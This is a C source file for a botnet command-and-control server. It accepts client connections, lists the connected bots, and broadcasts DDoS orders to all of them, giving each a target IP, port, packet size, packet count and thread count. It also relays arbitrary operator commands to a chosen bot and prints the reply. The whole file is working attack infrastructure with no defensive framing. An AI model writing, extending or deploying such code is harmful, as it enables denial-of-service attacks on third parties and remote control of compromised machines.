#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h> // Include pthread library for threading

#define MAX_CLIENTS 100
#define BUFFER_SIZE 1024
#define RESPONSE_TIMEOUT 20

// Client Struct
struct Client {
    int id;
    int socket_fd;
    char ip_address[INET_ADDRSTRLEN];
    // Add any other relevant fields here
};

// Global array of clients and number of clients
struct Client clients[MAX_CLIENTS];
int num_clients = 0;

// Global output buffer
char output_buffer[BUFFER_SIZE];

// Mutex to protect buffer from data corruption in the case
// that two threads attempt to access it simultaneously
pthread_mutex_t buffer_mutex = PTHREAD_MUTEX_INITIALIZER;

// Appending a message to the output buffer
void append_to_buffer(const char* message) {
    pthread_mutex_lock(&buffer_mutex);
    strncat(output_buffer, message, BUFFER_SIZE - strlen(output_buffer) - 1);
    pthread_mutex_unlock(&buffer_mutex);
}
// Function to display the output buffer contents
void display_buffer() {
    pthread_mutex_lock(&buffer_mutex); // Lock mutex before accessing the buffer
    printf("%s", output_buffer); // Print buffer contents
    fflush(stdout); // Flush stdout to ensure immediate display
    pthread_mutex_unlock(&buffer_mutex); // Unlock mutex after accessing the buffer
}

// Function to clear the output buffer
void clear_buffer() {
    pthread_mutex_lock(&buffer_mutex); // Lock mutex before clearing the buffer
    output_buffer[0] = '\0'; // Clear buffer
    pthread_mutex_unlock(&buffer_mutex); // Unlock mutex after clearing the buffer
}

// Function to add a new client to the array
void add_client(int socket_fd, struct sockaddr_in client_addr) {
    if (num_clients >= MAX_CLIENTS) {
        fprintf(stderr, "Error: Maximum number of clients reached\n");
        return;
    }

    // Add client information to the array
    clients[num_clients].id = num_clients + 1; // Unique ID
    clients[num_clients].socket_fd = socket_fd;
    inet_ntop(AF_INET, &(client_addr.sin_addr), clients[num_clients].ip_address, INET_ADDRSTRLEN);
    
    // Increment the number of clients
    num_clients++;
}

// Function to handle commands from the command prompt
void* command_prompt(void *arg) {
    char input[100];

    while (1) {
        display_buffer();
        clear_buffer();
        printf("Command: ");
        fgets(input, sizeof(input), stdin);
        input[strcspn(input, "\n")] = '\0'; // Remove trailing newline

        // Interpret the input and perform actions based on commands
        if (strcmp(input,"list") == 0) {
            printf("Clients Connected: %d\n", num_clients);
            for (size_t i = 0; i < num_clients; i++) {
                printf("--------\n");
                printf("Client ID: %d\n", clients[i].id);
                printf("Client IP: %s\n", clients[i].ip_address);
            }
        }  else if (strcmp(input,"DDOS") == 0) {
            char target_ip[15];
            int target_port;
            int packet_size;
            int num_packets;
            int num_threads;
            printf("You have selected DDOS. Type 'exit' to go back. Otherwise, type the target IP\n");
            printf("IP(exit)>");
            fgets(target_ip,  sizeof(target_ip), stdin);
            target_ip[strcspn(target_ip, "\n")] = '\0';
            if (strcmp(target_ip,"exit") == 0) {
                continue;
            }
            printf("Selected %s as target. Please enter the target port\n", target_ip);
            printf("Port>");
            scanf("%d", &target_port);
            printf("Selected %d as target port. Please enter the packet size\n", target_port);
            printf("Packet Size>");
            scanf("%d", &packet_size);
            printf("Selected %d as packet size. Please enter the number of packets sent by each thread\n", packet_size);
            printf("Amount of Packets>");
            scanf("%d", &num_packets);
            printf("Selected %d as number of packets sent by each thread. Please enter the number of threads that each client will run\n", num_packets);
            printf("Amount of Threads>");
            scanf("%d", &num_threads);
            for (int i = 0; i < num_clients; i++) {
                char message[150];
                sprintf(message, "shell %s %d %d %d %d", target_ip, target_port, packet_size, num_packets, num_threads);
                int sent = send(clients[i].socket_fd, message, sizeof(message), 0);
                if (sent == -1) {
                    append_to_buffer("Failed to send DDOS command - send()  returned -1");
                }
            }

        } else if (strcmp(input,"set") == 0) {
            int id_selected;
            printf("ID: ");
            scanf("%d", &id_selected);
            getchar();
            int client_socket = -1;
            for (int j = 0; j < num_clients; j++) {
                if (clients[j].id == id_selected) {
                    client_socket = clients[j].socket_fd;
                }
            }
            if (client_socket == -1) {
                perror("Finding client socket from id in command prompt");
                continue;
            }
            while (1) {
                char command[10];
                printf("%d>", id_selected);
                fgets(command, sizeof(command), stdin);
                printf("Selected: %s\n", command);
                command[strcspn(command, "\n")] = '\0'; // Remove trailing newline

                int sent = send(client_socket, command, sizeof(command), 0);
                if (sent == -1) {
                    printf("Error in sending.\n");
                }
                // Wait for response from the client with a 20-second timeout
                fd_set read_fds;
                FD_ZERO(&read_fds);
                FD_SET(client_socket, &read_fds);

                struct timeval timeout;
                timeout.tv_sec = 20; // 20 seconds
                timeout.tv_usec = 0;

                int ready = select(client_socket + 1, &read_fds, NULL, NULL, &timeout);
                if (ready == -1) {
                    // Error handling for select failure
                } else if (ready == 0) {
                    // Timeout occurred
                    printf("Timeout: No response from client.\n");
                    continue;
                } else {
                    // Data is available to read from the socket
                    char response[2048]; // Assuming response buffer size of 1024 bytes
                    int num_bytes_received = recv(client_socket, response, sizeof(response), 0);
                    if (num_bytes_received == -1) {
                        // Error handling for recv failure
                    } else if (num_bytes_received == 0) {
                        // Connection closed by the peer
                    } else {
                        // Successfully received response from the client
                        // Process the response as needed
                        printf("Response from client: %s\n", response);
                        printf("Press Return to continue.");
                        fgets(input, sizeof(input), stdin); // Wait for Enter keypress

                    }
                }
            }
        } else if (strcmp(input, "exit") == 0) {
            break;
        }
    }

    pthread_exit(NULL);
}


int main() {
    // declaring server socket
    int server_socket;
    // declaring sock addr struct
    struct sockaddr_in server_addr, client_addr;

    // server socket
    server_socket = socket(AF_INET, SOCK_STREAM, 0);
    int option = 1;

    setsockopt(server_socket, SOL_SOCKET, SO_REUSEADDR, &option, sizeof(option));
    if (server_socket == -1) {
        perror("socket");
        exit(EXIT_FAILURE);
    }

    // specifying the struct
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(9001);
    server_addr.sin_addr.s_addr = inet_addr("192.168.1.25");

    // binding
    if (bind(server_socket, (struct sockaddr *)&server_addr, sizeof(server_addr)) == -1) {
        perror("bind");
        exit(EXIT_FAILURE);
    }
    printf("Bound Socket.\n");

    // listening for connections
    if (listen(server_socket, 5) == -1) {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    // Create thread for command prompt
    pthread_t command_thread;
    if (pthread_create(&command_thread, NULL, command_prompt, NULL) != 0) {
        perror("pthread_create for command prompt");
        exit(EXIT_FAILURE);
    }

    while (1) {
        // Connection made! Establishing into previously declared client socket:
        int client_socket = accept(server_socket, (struct sockaddr *)&client_addr, &(socklen_t){sizeof(client_addr)});
        append_to_buffer("\nClient Has Connected. \n");
        if (client_socket == -1) {
            perror("accept");
            continue;
        }

        // Adding client to the array
        add_client(client_socket, client_addr);
    }

    // Join command prompt thread (wait for it to finish)
    if (pthread_join(command_thread, NULL) != 0) {
        perror("pthread_join for command prompt");
        exit(EXIT_FAILURE);
    }

    return 0;
}
